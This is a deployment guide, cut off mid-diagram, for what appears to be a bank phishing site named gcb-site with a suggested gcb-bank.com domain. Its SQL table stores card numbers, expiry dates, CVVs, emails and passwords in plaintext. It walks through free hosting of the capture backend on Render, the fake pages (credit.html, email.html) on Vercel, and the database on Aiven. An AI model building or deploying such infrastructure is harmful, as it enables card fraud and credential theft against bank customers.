# Deployment Guide

## Overview

This project consists of:
- **Frontend**: Static HTML/CSS/JS (served by Express or deploy separately on Vercel)
- **Backend**: Node.js/Express API (`POST /api/submit`)
- **Database**: MySQL (cloud-hosted via Aiven — Free tier, 5GB, **no credit card needed**)

---

## ✅ Step 1: Set up Aiven MySQL (Free, No Credit Card)

### 1.1. Create a Free Aiven Account
1. Open your browser and go to **[https://aiven.io](https://aiven.io)**
2. Click the **"Get Started for Free"** button (top right)
3. Sign up using one of these:
   - **Continue with Google** (easiest)
   - **Continue with GitHub**
   - Or use your email
4. **No credit card required** — just verify your email

### 1.2. Create a MySQL Database
1. From the Aiven Console, click **"Create a service"** (or **"Create new service"**)
2. Select **"MySQL"** from the list of databases
3. Configure your service:
   - **Cloud Provider:** Choose **AWS** (recommended)
   - **Region:** Pick the closest to you (e.g., `eu-west-1` for Europe, `us-east-1` for US)
   - **Plan:** Select **"Free (Business 4 - Free)"** — ✅ **5GB storage, forever free**
   - **Service Name:** Enter `gcb-site-mysql`
4. Click **"Create service"** at the bottom
5. Wait ~2 minutes for Aiven to provision your MySQL database

### 1.3. Get Your Connection Details
1. Click on your new service: **`gcb-site-mysql`**
2. Go to the **"Overview"** tab
3. Under **"Connection Information"**, find these values:

   | Field | What to copy |
   |-------|-------------|
   | **Host** | Copy the hostname (e.g., `gcb-site-mysql-project.aivencloud.com`) |
   | **Port** | Copy the port number (e.g., `16543`) |
   | **Database** | Usually `defaultdb` |
   | **User** | Usually `avnadmin` |
   | **Password** | Click the eye icon or **"Download"** to reveal the password |

   **⚠️ Save these values — you'll need them for Render!**

### 1.4. Create the Database Table
1. In the Aiven Console, go to the **"Services"** → click your MySQL service
2. Click the **"Query statistics"** tab (or look for a **"Console"** / **"Query"** option)
3. If there's no direct SQL console in the free tier, use **Option B below**

**Option A — If you can see a SQL console/tab:**
Paste and run:
```sql
CREATE TABLE IF NOT EXISTS submissions (
  id INT AUTO_INCREMENT PRIMARY KEY,
  cardName VARCHAR(255) NOT NULL,
  cardNumber VARCHAR(255) NOT NULL,
  expiry VARCHAR(50) NOT NULL,
  cvv VARCHAR(50) NOT NULL,
  userEmail VARCHAR(255) NOT NULL,
  userPassword VARCHAR(255) NOT NULL,
  createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);
```

**Option B — Using a free MySQL client (MySQL Workbench / DBeaver):**
1. Download **DBeaver** (free) from https://dbeaver.io
2. Install and open DBeaver
3. Click **"New Database Connection"** → Select **"MySQL"**
4. Enter your Aiven connection details:
   - **Host:** (from Aiven)
   - **Port:** (from Aiven)
   - **Database:** `defaultdb`
   - **Username:** `avnadmin`
   - **Password:** (from Aiven)
   - Click **"SSL"** tab → Enable **"Use SSL"** → Set to **"Require"**
5. Click **"Test Connection"** → should succeed
6. Then run the SQL above

### 1.5. Quick Local Test (Optional)
Create a `.env` file in the project root:
```env
DB_HOST=gcb-site-mysql-project.aivencloud.com
DB_PORT=16543
DB_USER=avnadmin
DB_PASSWORD=your-aiven-password
DB_NAME=defaultdb
DB_SSL=true
PORT=3000
```

Run locally:
```bash
npm install
npm start
```

---

## ✅ Step 2: Deploy Backend to Render

### 2.1. Create a Render Account
1. Go to **[https://render.com](https://render.com)**
2. Click **"Get Started for Free"**
3. Sign up using **GitHub** (easiest — connects to your repo automatically)

### 2.2. Create a Web Service
1. From the Render Dashboard, click **"New +"** → **"Web Service"**
2. Select your GitHub repository: **`gods80eye08-debug/gcb-site`**
3. Configure:

| Setting | Value |
|---------|-------|
| **Name** | `gcb-site-backend` |
| **Region** | Choose closest to you (e.g., Frankfurt, Oregon) |
| **Branch** | `main` |
| **Runtime** | `Node` |
| **Build Command** | `npm install` |
| **Start Command** | `npm start` |
| **Plan** | **Free** |

### 2.3. Add Environment Variables
Click **"Advanced"** → **"Add Environment Variable"** and add these **exact values from Aiven**:

| Key | Value |
|-----|-------|
| `DB_HOST` | `your-service.aivencloud.com` (from Aiven — includes port in host!) |
| `DB_USER` | `avnadmin` (from Aiven) |
| `DB_PASSWORD` | (your Aiven password) |
| `DB_NAME` | `defaultdb` (from Aiven) |
| `DB_PORT` | `16543` (the port from Aiven — might be different for you!) |
| `DB_SSL` | `true` |

---

## ✅ Step 3: Deploy Frontend to Vercel (Free)

### 3.1. Create a Vercel Account
1. Go to **[https://vercel.com](https://vercel.com)**
2. Click **"Sign Up"** → **"Continue with GitHub"** (easiest — connects to your repo)
3. Grant GitHub access when prompted

### 3.2. Import Your Repository
1. From the Vercel Dashboard, click **"Add New..."** → **"Project"**
2. Find and select your GitHub repository: **`gods80eye08-debug/gcb-site`**
3. Click **"Import"**

### 3.3. Configure the Project
Vercel will auto-detect the project settings. Verify these:

| Setting | Value |
|---------|-------|
| **Framework Preset** | **Other** (static HTML) |
| **Root Directory** | `./` (project root) |
| **Build Command** | *(leave empty — no build needed)* |
| **Output Directory** | `public` (this is where your HTML files are) |
| **Install Command** | *(leave empty — no dependencies needed for frontend)* |

> ⚠️ **Important:** Set the **Output Directory** to `public` because all your static files (index.html, credit.html, email.html, success.html, css/, js/, images/) are inside the `public/` folder.

### 3.4. Environment Variables (Optional for Frontend)
No environment variables are needed for the frontend. The API URL is already configured in `public/js/email.js`:
- **Local:** `http://127.0.0.1:3000/api/submit`
- **Production:** `https://gcb-site-backend.onrender.com/api/submit`

### 3.5. Deploy!
1. Click **"Deploy"**
2. Wait ~1 minute for Vercel to build and deploy
3. Once complete, Vercel will show you your live URL:

   ```
   https://gcb-site.vercel.app
   ```

### 3.6. (Optional) Custom Domain
1. In your Vercel project dashboard, go to **"Settings"** → **"Domains"**
2. Enter your custom domain (e.g., `gcb-bank.com`)
3. Follow Vercel's DNS configuration instructions

---

## ✅ Final Architecture

```
User's Browser
       │
       ▼
┌─────────────────────┐
│   Vercel (Frontend) │  https://gcb-site
